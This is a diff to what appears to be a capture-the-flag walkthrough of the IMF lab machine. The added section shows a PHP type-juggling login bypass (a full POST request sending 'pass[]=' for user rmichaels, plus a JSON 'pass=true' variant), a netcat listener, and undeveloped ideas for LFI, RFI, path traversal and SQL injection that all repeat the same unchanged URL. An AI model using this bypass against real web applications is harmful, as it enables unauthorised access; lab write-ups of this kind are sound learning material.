@@ -271,7 +271,7 @@ http://192.168.100.52 [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ],
 
 ```
 
-seems that does not give us a lo of information.
+seems that does not give us a lot of information.
 
 So let's visit the web the port 
 
@@ -485,4 +485,105 @@ seems that we can use a method called ```trugglin``` if is not sanitized
 
 let's try 
 
-the attack consist in to add [] in the field of password and we found some possible users when we were enumerating the port 80 let's try it 
+the attack consist in to add [] in the field of password and we found some possible users ```rmichaels``` when we were enumerating the port 80 let's try it 
+
+## Gaining Access
+
+```php
+POST /imfadministrator/ HTTP/1.1
+
+Host: 192.168.100.52
+
+Content-Length: 22
+
+Cache-Control: max-age=0
+
+Upgrade-Insecure-Requests: 1
+
+Origin: http://192.168.100.52
+
+Content-Type: application/x-www-form-urlencoded
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+Referer: http://192.168.100.52/imfadministrator/
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: es-419,es;q=0.9
+
+Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
+
+Connection: close
+
+
+
+user=rmichaels&pass[]=
+
+```
+
+this can be explote it because is doing a comparison, 
+```bash 
+user=rmichaels&pass[]=
+```
+
+
+another very strong point to mention is that there's another common struggling bypass called Json byPass truggling which consist in add true in password fiel example 
+
+```bash
+
+{
+user= rmichaels
+
+pass= true 
+
+}
+```
+that's how we will made in another scenario 
+
+now if we stop intercepting the connection we will watch another pannel 
+
+to stop it, we have to  ```proxy``` > ```intercept``` > ```turn off``` 
+
+
+output from port 80
+
+IMF CMS
+Menu: Home | Upload Report | Disavowed list | Logout
+
+Welcome to the IMF Administration.
+
+take a look of the URL 
+
+```http://192.168.100.52/imfadministrator/cms.php?pagename=home```
+
+is asking things to localhost
+
+we can try a LFI to visualize content from the localhost
+
+```http://192.168.100.52/imfadministrator/cms.php?pagename=home```
+
+we can try a Directory Path traversal to reaload a route from the local host
+
+```http://192.168.100.52/imfadministrator/cms.php?pagename=home```
+
+we can try a RFI
+
+```http://192.168.100.52/imfadministrator/cms.php?pagename=home```
+
+and from our machine we have to stay listening at nc -nlvp  443
+
+
+to check if we receive data we can stay listing from I ens33 using wireShark 
+
+
+
+we can try a SQLIN
+
+```http://192.168.100.52/imfadministrator/cms.php?pagename=home```
+
+it seems that the shots are aimed at exploiting SQL
+
+
